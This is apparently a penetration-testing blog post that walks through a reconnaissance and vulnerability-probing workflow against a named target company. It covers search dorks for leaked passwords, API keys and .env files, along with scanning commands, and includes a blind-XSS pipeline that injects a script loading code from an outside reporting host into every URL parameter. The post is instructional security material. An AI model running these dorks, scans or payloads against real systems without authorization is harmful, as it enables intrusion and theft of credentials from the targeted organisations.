---
layout: post
title: "From Name to Shell-Ready: A Deep Dive into a Real-World Recon Workflow"
date: 2025-06-30 13:15:27 +0000
categories: [pentesting, reconnaissance, technical]
---

So, you've landed the engagement. The scope is defined, the rules of engagement are set, and the target is locked: **GravexLabs**. You have the name, and that's it. This is the starting point for every offensive security operation, a blank canvas that, through skill and methodology, will be painted into a detailed map of attack surfaces, endpoints, and potential vulnerabilities.

This isn't just about running a few tools. It's a structured process, a symphony of techniques designed to peel back the layers of a target's digital presence. RAWPA is made for this process. While RAWPA is built to host and guide you through complete pentesting methodologies, today I want to give you something more concrete. I'm going to walk you through my personal, battle-tested reconnaissance workflow.

This process is so central to my work that I've even streamlined it into a framework called **AAweRT - An Awesome Reconnaissance Tool** ([github.com/Kuwguap/aawert/](https://github.com/Kuwguap/aawert/))

![AAweRT](https://raw.githubusercontent.com/Kuwguap/kuwguap.github.io/main/assets/img/aawert.png)

which encapsulates the logic we're about to explore. Forget the "get bugs quick" fantasy; this is about building a foundation of deep intelligence for a successful, professional engagement.

Grab your terminal. Let's begin the hunt.

### Phase 1: The OSINT Dragnet - Reconnaissance Without Touching

Before we send a single packet to GravexLabs' servers, we gather intelligence from the vast ocean of public information. This is Open-Source Intelligence (OSINT), and it’s the quietest and often most revealing phase.

#### **1.1: Advanced Search Fu: Google and GitHub Dorking**

Never, ever underestimate the power of a well-crafted search query.

* **Google Dorking:** We use advanced operators to find what isn't meant to be found.
    * `site:gravexlabs.com` - The basics, map out the intended public site.
    * `site:*.gravexlabs.com -www` - Find all subdomains indexed by Google, excluding the main `www` site.
    * `inurl:gravexlabs filetype:log` - Hunt for exposed log files.
    * `intext:"GravexLabs API Key" | intext:"GravexLabs password"` - The long shots that sometimes pay off spectacularly.

* **GitHub Dorking:** This is non-negotiable for any modern company. Developers make mistakes, and public repositories can be a goldmine of leaked secrets.
    * `"gravexlabs.com" password` - Search for hardcoded passwords related to the domain.
    * `"gravexlabs.com" api_key` - Hunt for API keys.
    * `"gravexlabs.com" filename:config.js` - Look for configuration files.
    * `"gravexlabs.com" filename:.env` - Search for leaked environment files, which often contain database credentials, secret keys, and more.

#### **1.2: Mapping the Infrastructure: ASN, crt.sh, and Censys**

Next, we map the physical and logical infrastructure.

* **ASN Lookup:** We identify GravexLabs' Autonomous System Number (ASN) using `whois` on their domain's IP. This ASN is their unique identifier on the internet. With the ASN, we can query BGP data to find all IP ranges they own. This is our hunting ground.

* **Certificate Transparency (crt.sh):** Every time an SSL/TLS certificate is issued, it's logged publicly. Searching `crt.sh` for `%.gravexlabs.com` gives us a historical and current list of subdomains. This often reveals internal, staging, or forgotten assets that are still live.

* **Censys.io:** Think of Censys as a search engine for the devices and networks that make up the internet. We can search for GravexLabs' ASN or known IP ranges to get a bird's-eye view of their open ports and running services across their entire infrastructure, often identifying services without needing to scan them directly ourselves.

### Phase 2: The Command Line Unleashed - A Live-Fire Methodology

With our passive intelligence gathered, it's time to get our hands dirty. The following is a highly effective, tool-driven workflow that forms the core of my `AAweRT` framework. It's designed for efficiency and depth, moving logically from broad discovery to specific vulnerability probing.

#### **2.1: Mass Subdomain Discovery**

Our OSINT work gave us a good starting list, but it's not exhaustive. We now use `subfinder` to actively and passively enumerate every possible subdomain.

```bash
subfinder -dL domains.txt -all -recursive -o subdomains.txt
```

* `subfinder -dL domains.txt`: We feed it a file (`domains.txt`) containing our root domain (`gravexlabs.com`).

* `-all`: This is crucial. It tells `subfinder` to use all its available passive sources (like crt.sh, Virustotal, etc.).

* `-recursive`: If it finds `dev.gravexlabs.com`, it will then search for subdomains of that, like `api.dev.gravexlabs.com`. This is how you find deep, forgotten assets.

* `-o subdomains.txt`: We save our massive list of findings for the next step.

#### **2.2: Probing for Life**
We have a list of hundreds, maybe thousands, of potential subdomains. Are they alive? Are they hosting web services? `httpx-toolkit` answers this with blistering speed.

```bash
cat subdomains.txt | httpx-toolkit -ports 443,80,8080,8000,8888 -threads 200 -o subdomains_alive.txt
```

* `cat subdomains.txt` |: We pipe our list directly into `httpx-toolkit`.

* `-ports 443,80,8080,8000,8888`: We focus on the most common HTTP/HTTPS ports. This is a strategic choice to balance speed and coverage.

* `-threads 200`: We crank up the concurrency for speed. Adjust this based on your machine and network.

* `-o subdomains_alive.txt`: The output is a clean list of live web servers, ready for deeper inspection.


#### **2.3: Mapping the Digital Attack Surface with Katana**
Now we know what's live. The next question is what's on it? `katana`, a web crawler on steroids, will spider these sites to find endpoints, JavaScript files, and other interesting paths.
```bash
katana -u subdomains_alive.txt -d 5 -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif -o allurls.txt
```

* `-u subdomains_alive.txt`: We feed it our list of live hosts.

* `-d 5`: We set a crawl depth of 5 levels.

* `-pss waybackarchive,commoncrawl,alienvault`: This is pure gold. It tells katana to not only crawl the live site but also pull historical URLs from passive sources like the Wayback Machine. This finds endpoints that may no longer be linked but still exist.

* `-kf`: Also crawl for known files (e.g., .git-config, .env).

* `-jc`: Parse JavaScript files for hidden paths and endpoints.

* `-fx -ef ...`: We filter out uninteresting file extensions like fonts and images to keep our output clean and focused on actionable URLs.

* `-o allurls.txt`: All discovered URLs are saved. This file is now our primary source for vulnerability hunting.

#### Phase 3: Analysis & Initial Vulnerability Scanning
With a huge list of URLs, we can begin our automated, targeted analysis.

#### **3.1: The Hunt for Leaks and Secrets**
The first quick win is to search our URL list for files that should never be public.

```bash
cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
```

This simple `grep` command filters our massive URL list for common sensitive file extensions. Finding a `.log`, `.backup`, or `.config` file can often lead to immediate information disclosure.

#### **3.2: JavaScript Recon and Exposure Scanning**
JavaScript files are a treasure map of application logic. We first isolate them and then run specialized scans.

```bash
cat allurls.txt | grep -E "\.js$" >> js.txt
```

```bash
cat js.txt | nuclei -t ~/nuclei-templates/http/exposures/ -c 30
```

* First, we `grep` all URLs ending in .js into a dedicated file.

* Then, we feed this list to `nuclei`, a powerful pattern-based scanner. We use the `exposures` templates, which are specifically designed to find things like API keys, secrets, and sensitive information accidentally hardcoded in JavaScript files.

#### **3.3: Checking for Subdomain Takeover**
A common misconfiguration is a DNS CNAME record pointing to a service (like an S3 bucket or a GitHub page) that has been de-provisioned. If we can re-register that service, we can take over the subdomain. `subzy` automates this check.

```bash
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```

This tool quickly checks our full subdomain list for fingerprints of services vulnerable to takeover. A single finding here can lead to a critical vulnerability.

### **3.4: Probing for CORS Misconfigurations**
Cross-Origin Resource Sharing (CORS) misconfigurations can allow a malicious website to make requests to the target application on behalf of a user. We attack this in two ways.

```bash
python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: Googlebot\nCookie: SESSION=Hacked"
```

```bash
nuclei -l subdomains_alive.txt -t ~/nuclei-templates/http/cors/ -c 30
```

* `corsy`: This specialized tool sends probes with various Origin headers to test CORS policies. We add custom headers to mimic other scenarios.

* `nuclei`: We then run Nuclei's dedicated CORS templates for a second, comprehensive check against known misconfigurations.

### Phase 4: Active Probing for Common Vulnerabilities
This is a chained command for maximum efficiency.

### **4.1: XSS (Cross-Site Scripting)**
```bash
subfinder -d gravexlabs.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=[https://xss.report/c/kuwguap](https://xss.report/c/kuwguap)></script>' -parameters
```

Let's break it down:

* `subfinder | httpx-toolkit | katana`: We find, validate, and crawl for URLs in one go.

* `| gf xss`: We pipe the URLs to `gf` (grep-friend). Using its `xss` patterns, it filters for URLs that have parameters likely to be vulnerable to XSS (e.g., `?redirect=`, `?q=`, `?next=`).

* `| bxss`: This final pipe sends the highly-qualified URLs to `bxss`, which automates the testing by injecting our custom payload (which points to an XSS reporting service) into every parameter.

### **4.2: LFI (Local File Inclusion) & Open Redirects**
We use a similar `gf`-powered methodology for other bug classes.

# LFI
```bash
cat allurls.txt | gf lfi | nuclei -t ~/nuclei-templates/http/vulnerabilities/lfi/
```

# Open Redirect
```bash
cat allurls.txt | gf redirect | openredirex -p payloads.txt
```

For LFI, we find potential patterns with `gf` and then use Nuclei's powerful LFI templates to attempt exploitation safely.

For Open Redirects, we find potential URLs with `gf` and then use `openredirex` with a list of crafted payloads to confirm the vulnerability.

### **4.3: CRLF Injection**
CRLF injection can lead to response splitting and other attacks. Nuclei has excellent templates for this.

```bash
cat subdomains_alive.txt | nuclei -t ~/nuclei-templates/http/vulnerabilities/crlf-injection.yaml -v
```
We feed our live hosts directly to Nuclei and let its specialized template handle the complex injection tests.

### **4.4: Server-Specific Checks: IIS Short Filename**
If we identify a Microsoft IIS server, we run a specialized check. The "short filename" vulnerability can allow an attacker to guess the names of hidden files and folders.

```bash
shortscan [https://iis.gravexlabs.com](https://iis.gravexlabs.com) -F
```
`shortscan` is the perfect tool for this, automating the entire guessing process.

### **The Culmination: From a Name to a Blueprint**
Look at what we've accomplished. We started with a name, "GravexLabs," and now we have a blueprint for a full-scale offensive operation. We have a list of live assets, their technologies, mapped endpoints, and a prioritized list of potential vulnerabilities including information leaks, subdomain takeovers, CORS issues, XSS, LFI, and more.

This is the power of a structured, tool-assisted methodology. It's repeatable, scalable, and incredibly effective. This entire workflow, and many others, are what I've aimed to codify and simplify with my AAweRT framework. For those looking to explore even more complex, hierarchical methodologies for every stage of a penetration test, platforms like RAWPA are designed to provide that interactive guidance.
![AAweRT](https://raw.githubusercontent.com/Kuwguap/kuwguap.github.io/main/assets/img/rawpa-up.png)

The hunt is complete. The real attack can now begin. Business Logic flaws, Authorization and Privilege Escalation Flaws, Workflow and State Manipulation Bypasses, Feature and Functionality Abuse and more.




